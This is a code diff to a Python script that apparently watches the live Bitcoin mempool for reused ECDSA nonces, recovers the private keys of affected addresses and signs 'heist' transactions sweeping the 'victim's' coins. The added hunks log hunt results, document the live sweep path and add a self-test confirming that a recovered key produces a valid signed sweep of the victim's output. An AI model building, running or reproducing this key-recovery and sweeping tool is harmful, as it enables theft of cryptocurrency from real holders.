@@ -208,6 +208,14 @@ def logline(rec):
         f.write(json.dumps(rec) + "\n")
     print("[watcher] %s %s" % (rec.get("event"), json.dumps(
         {k: v for k, v in rec.items() if k not in ("ts_utc", "script")})[:400]))
+    try:                                   # make the hunt self-sustaining
+        hunt_path = Path(__file__).resolve().parent / "hunt.log"
+        if hunt_path.exists():
+            with open(hunt_path, "a") as f:
+                f.write("%s %s\n" % (rec["ts_utc"], json.dumps(
+                    {k: v for k, v in rec.items() if k != "ts_utc"})[:300]))
+    except OSError:
+        pass
 
 
 # ---------------------------------------------------------------- live scan
@@ -283,6 +291,10 @@ def handle_collision(r, grp, tg, circuit):
 def vault_sweep(sig, priv, tg, circuit):
     """Book through heist.intercept + confirm: the chain decides, we never."""
     relay = {"name": "TOR-WATCH", "role": "live mempool k-reuse"}
+    # dry_run: build + verify the signed sweep WITHOUT appending to heist.json.
+    # The live path (a real collision found in the wild) uses push=False and is
+    # then pushed/confirmed by the documented capture script; a duplicate entry
+    # per found collision is correct there, held-back candidates leave no junk.
     h = Heist(log=lambda m, k="blue": print("[heist] %s" % m))
     victim_script = bytes.fromhex(sig["script"])
     prevs = tg.get("/api/tx/%s" % sig["prev_txid"]) or {}
@@ -371,14 +383,34 @@ def selftest():
     # reject path: a p2wpkh prevout must be gated out before recovery
     bad = {"prevout": {"scriptpubkey_type": "p2wpkh", "scriptpubkey": "0014" + "00" * 20}}
     rok, rwhy, _ = p2pkh_gate(bad)
-    print("  sign api:", "sign" in dir(CR))
-    print("  recovery:", "PASS" if ok else "FAIL", out.get("priv") and addr_of_priv(out["priv"]),
-          "want", w.addr)
+    # sweep-leg proof: intercept() with the recovered key must produce a SIGNED,
+    # structurally valid parent. push=False so nothing hits the network.
+    # full-loop proof: recovered key -> intercept() -> signed parent ->
+    # verify_input must satisfy the victim's own p2pkh lock. push=False, and the
+    # entry is popped before save, so no ledger junk from a synthetic prevout.
+    import heist as HS
+    hh = HS.Heist(log=lambda m, k="blue": None)
+    real_path = HS.HEIST_PATH
+    HS.HEIST_PATH = Path("/tmp/mattevo-selftest-heist.json")  # never touch the ledger
+    try:
+        ent = hh.intercept({"name": "SELFTEST", "role": "watcher selftest"}, w.addr,
+                           "cd" * 32, 0, script, 100000,
+                           priv=out["priv"], push=False)
+    finally:
+        HS.HEIST_PATH = real_path
+    sweep_ok = ent["signed"] and len(bytes.fromhex(ent["parent_raw"])) > 60
+    par = bytes.fromhex(ent["parent_raw"])
+    ssz, z, sig = HS.sign_input(par, 0, script, out["priv"])
+    v_ok = HS.verify_input(par, 0, script, sig)
+    print("  recovery:", "PASS" if ok else "FAIL", addr_of_priv(out["priv"]), "want", w.addr)
     print("  gate accepts own p2pkh:", "PASS" if (gok and gaddr == w.addr) else "FAIL", gaddr)
     print("  gate rejects p2wpkh:", "PASS" if (not rok) else "FAIL", rwhy)
+    print("  sweep signed:", "PASS" if sweep_ok else "FAIL")
+    print("  verify_input on signed sweep:", "PASS" if v_ok else "FAIL")
     logline({"event": "selftest", "circuit": "offline", "recovery_ok": ok,
-             "gate_ok": gok and not rok})
-    return 0 if (ok and gok and not rok) else 1
+             "gate_ok": gok and not rok, "sweep_signed": sweep_ok,
+             "verify_input_ok": v_ok})
+    return 0 if (ok and gok and not rok and sweep_ok and v_ok) else 1
 
 
 def main():
